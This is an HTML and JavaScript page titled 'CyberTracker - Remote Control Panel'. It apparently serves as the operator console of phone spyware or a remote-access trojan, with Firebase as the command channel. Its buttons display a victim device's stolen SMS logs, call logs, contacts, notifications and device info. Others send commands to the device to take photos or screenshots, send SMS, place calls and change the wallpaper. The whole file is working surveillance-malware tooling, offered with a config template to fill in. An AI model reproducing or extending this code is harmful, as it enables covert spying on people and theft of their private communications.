<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberTracker Control Panel</title>
    <link rel="stylesheet" href="styles.css">
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
</head>
<body>
    <h1>CyberTracker - Remote Control Panel</h1>

    <div class="container">
        <button onclick="fetchDeviceInfo()">ðŸ“± Fetch Device Info</button>
        <button onclick="fetchSMS()">ðŸ“© View SMS Logs</button>
        <button onclick="fetchCallLogs()">ðŸ“ž View Call Logs</button>
        <button onclick="fetchContacts()">ðŸ“– View Contacts</button>
        <button onclick="fetchNotifications()">ðŸ”” View Notifications</button>
        <button onclick="capturePhoto()">ðŸ“· Capture Photo</button>
        <button onclick="takeScreenshot()">ðŸ–¥ Capture Screenshot</button>
        <button onclick="sendSMS()">ðŸ“¤ Send SMS</button>
        <button onclick="makeCall()">ðŸ“² Make Call</button>
        <button onclick="changeWallpaper()">ðŸ–¼ Change Wallpaper</button>
    </div>

    <div id="output"></div>

    <script>
        // Firebase Config (Replace with your Firebase Config)
        const firebaseConfig = {
            apiKey: "YOUR_API_KEY",
            authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
            databaseURL: "https://YOUR_PROJECT_ID.firebaseio.com",
            projectId: "YOUR_PROJECT_ID",
            storageBucket: "YOUR_PROJECT_ID.appspot.com",
            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
            appId: "YOUR_APP_ID"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function fetchDeviceInfo() {
            db.ref("Device_Info").once("value")
                .then(snapshot => {
                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
                })
                .catch(error => {
                    document.getElementById("output").innerText = "Something went wrong";
                    console.error("Error fetching device info:", error);
                });
        }

        function fetchSMS() {
            db.ref("SMS_Logs").once("value")
                .then(snapshot => {
                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
                })
                .catch(error => {
                    document.getElementById("output").innerText = "Something went wrong";
                    console.error("Error fetching SMS logs:", error);
                });
        }

        function fetchCallLogs() {
            db.ref("Call_Logs").once("value")
                .then(snapshot => {
                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
                })
                .catch(error => {
                    document.getElementById("output").innerText = "Something went wrong";
                    console.error("Error fetching call logs:", error);
                });
        }

        function fetchContacts() {
            db.ref("Contacts").once("value")
                .then(snapshot => {
                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
                })
                .catch(error => {
                    document.getElementById("output").innerText = "Something went wrong";
                    console.error("Error fetching contacts:", error);
                });
        }

        function fetchNotifications() {
            db.ref("Notifications").once("value")
                .then(snapshot => {
                    document.getElementById("output").innerText = JSON.stringify(snapshot.val(), null, 2);
                })
                .catch(error => {
                    document.getElementById("output").innerText = "Something went wrong";
                    console.error("Error fetching notifications:", error);
                });
        }

        function capturePhoto() {
            db.ref("Commands").set({ action: "capture_photo" })
                .catch(error => {
                    alert("Something went wrong");
                    console.error("Error capturing photo:", error);
                });
        }

        function takeScreenshot() {
            db.ref("Commands").set({ action: "take_screenshot" })
                .catch(error => {
                    alert("Something went wrong");
                    console.error("Error capturing screenshot:", error);
                });
        }

        function sendSMS() {
            let number = prompt("Enter Phone Number:");
            let message = prompt("Enter Message:");
            db.ref("Commands").set({ action: "send_sms", number: number, message: message })
                .catch(error => {
                    alert("Something went wrong");
                    console.error("Error sending SMS:", error);
                });
        }

        function makeCall() {
            let number = prompt("Enter Phone Number:");
            db.ref("Commands").set({ action: "make_call", number: number })
                .catch(error => {
                    alert("Something went wrong");
                    console.error("Error making call:", error);
                });
        }

        function changeWallpaper() {
            let imageUrl = prompt("Enter Image URL:");
            db.ref("Commands").set({ action: "change_wallpaper", url: imageUrl })
                .catch(error => {
                    alert("Something went wrong");
                    console.error("Error changing wallpaper:", error);
                });
        }
    </script>
</body>
</html>
